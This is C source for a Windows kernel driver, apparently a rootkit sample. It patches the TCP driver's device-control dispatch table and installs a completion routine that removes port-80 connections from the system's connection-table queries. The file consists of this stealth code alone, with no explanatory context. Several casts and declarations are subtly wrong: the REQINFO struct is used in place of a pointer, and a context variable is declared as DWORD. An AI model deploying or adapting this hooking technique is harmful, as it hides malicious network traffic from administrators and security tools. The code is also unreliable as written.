#include "ntddk.h"

typedef unsigned short WCHAR, WORD;
typedef unsigned long ULONG, DWORD;
typedef unsigned char CHAR, BYTE;
typedef unsigned long* PULONG;

PFILE_OBJECT pFile = NULL;
PDEVICE_OBJECT pDevTcp= NULL;
PDRIVER_OBJECT pDrvTcp = NULL;

typedef NTSTATUS (*FUNCTION)(IN PDEVICE_OBJECT, IN PIRP);
FUNCTION old;

#define CO_TL_ENTITY 0x400
#define CL_TL_ENTITY 0x401
#define IOCTL_TCP_QUERY 0x00120003

typedef struct _TDIEntityID {
	ULONG tei_entity;
	ULONG tei_instance;
} TDIEntityID;
typedef struct _TDIObjectID {
	TDIEntityID toi_entity;
	ULONG toi_class;
	ULONG toi_type;
	ULONG toi_id;
} TDIObjectID;

typedef struct _REQINFO {
	PIO_COMPLETION_ROUTINE old;
	ULONG ReqType;
} REQINFO, *PRQINFO;


#define HTONS(a)  ((((a) & 0xFF)<<8) + (((a) & 0xFF00)>>8))
typedef struct _CONNINFO101 {
	ULONG status;
	ULONG src_addr;
	WORD src_port;
	WORD u1;
	ULONG dst_addr;
	WORD dst_port;
	WORD u2;
} CONNINFO101, *PCONNINFO101;
typedef struct _CONNINFO102 {
	ULONG status;
	ULONG src_addr;
	WORD src_port;
	WORD u1;
	ULONG dst_addr;
	WORD dst_port;
	WORD u2;
	ULONG pid;
} CONNINFO102, *PCONNINFO102;
typedef struct _CONNINFO110 {
	ULONG status;
	ULONG src_addr;
	WORD src_port;
	WORD u1;
	ULONG dst_addr;
	WORD dst_port;
	WORD u2;
	ULONG pid;
	PVOID u3[35];
} CONNINFO110, *PCONNINFO110;


NTSTATUS IoCompleteRoutine(IN PDEVICE_OBJECT device, 
						   IN PIRP pIrp, 
						   IN PVOID context)
{
	PVOID outputBuffer;
	DWORD NumberOfOutput;
	PIO_COMPLETION_ROUTINE pCompRoutine;
	DWORD i;

	outputBuffer = pIrp->UserBuffer;
	pCompRoutine = ((REQINFO)context)->old;
	if (((REQINFO)context)->ReqType == 0x101)
	{
		NumberOfOutput = pIrp->IoStatus.Information /
			sizeof(CONNINFO101);
		for (i=0; i<NumberOfOutput; i++)
		{
			if (HTONS(((PCONNINFO101)outputBuffer)[i].dst_port) == 80)
				((PCONNINFO101)outputBuffer)[i].status = 0;
		}
	}
	else if (((REQINFO)context)->ReqType == 0x102)
	{
		NumberOfOutput = pIrp->IoStatus.Information /
			sizeof(CONNINFO102);
		for (i=0; i<NumberOfOutput; i++)
		{
			if (HTONS(((PCONNINFO102)outputBuffer)[i].dst_port) == 80)
				((PCONNINFO102)outputBuffer)[i].status = 0;
		}
	}
	else if (((REQINFO)context)->ReqType == 0x110)
	{
		NumberOfOutput = pIrp->IoStatus.Information /
			sizeof(CONNINFO110);
		for (i=0; i<NumberOfOutput; i++)
		{
			if (HTONS(((PCONNINFO110)outputBuffer)[i].dst_port) == 80)
				((PCONNINFO110)outputBuffer)[i].status = 0;
		}
	}
	ExFreePool(context);
	if ((pIrp->StackCount > 1) 
		&& (pCompRoutine != NULL))
	{
		return pCompRoutine(device, pIrp, NULL);
	}
	else
	{
		return pIrp->IoStatus.Status;
	}
}
NTSTATUS MyFunc(IN PDEVICE_OBJECT device, IN PIRP pIrp)
{
	PIO_STACK_LOCATION irpStack;
	TDIObjectID *inputBuffer;
	DWORD context;

	irpStack = IoGetCurrentIrpStackLocation(pIrp);
	switch (irpStack->MajorFunction)
	{
	case IRP_MJ_DEVICE_CONTROL:
		if ((irpStack->MinorFunction == 0) &&
			(irpStack->Parameters.DeviceIoControl.IoControlCode ==
			IOCTL_TCP_QUERY))
		{
			inputBuffer = (TDIObjectID*)
				irpStack->Parameters.DeviceIoControl.Type3InputBuffer;
			if (inputBuffer->toi_entity.tei_entity == CO_TL_ENTITY)
			{
				if ((inputBuffer->toi_id == 0x101) ||
					(inputBuffer->toi_id == 0x102) ||
					(inputBuffer->toi_id == 0x110))
				{
					irpStack->Control = SL_INVOKE_ON_SUCCESS;
					irpStack->Context = (PIO_COMPLETION_ROUTINE)
						ExAllocatePool(NonPagedPool, sizeof(REQINFO));
					((REQINFO)irpStack->Context)->old = 
						irpStack->CompletionRoutine;
					((REQINFO)irpStack->Context)->ReqType = 
						inputBuffer->toi_id;
					irpStack->CompletionRoutine = 
						(PIO_COMPLETION_ROUTINE)IoCompleteRoutine;
				}
			}
		}
		break;
	default:
		break;
	}
	return old(device, pIrp);
}


NTSTATUS Hook()
{
	NTSTATUS status;
	UNICODE_STRING usDevTcp;
	WCHAR szDevTcpBuffer[] = L"\\Device\\Tcp";
	RtlInitUnicodeString(
		&usDevTcp, 
		szDevTcpBuffer);

	status = IoGetDeviceObjectPointer(
		&usDevTcp, 
		FILE_READ_DATA, 
		&pFile, 
		&pDevTcp);
	if (status != STATUS_SUCCESS)
		return status;

	pDrvTcp = pDevTcp->DriverObject;
	old = (FUNCTION)InterlockedExchange(
		(PULONG)&pDrvTcp->MajorFunction[IRP_MJ_DEVICE_CONTROL], 
		(ULONG)MyFunc);

	return status;
}
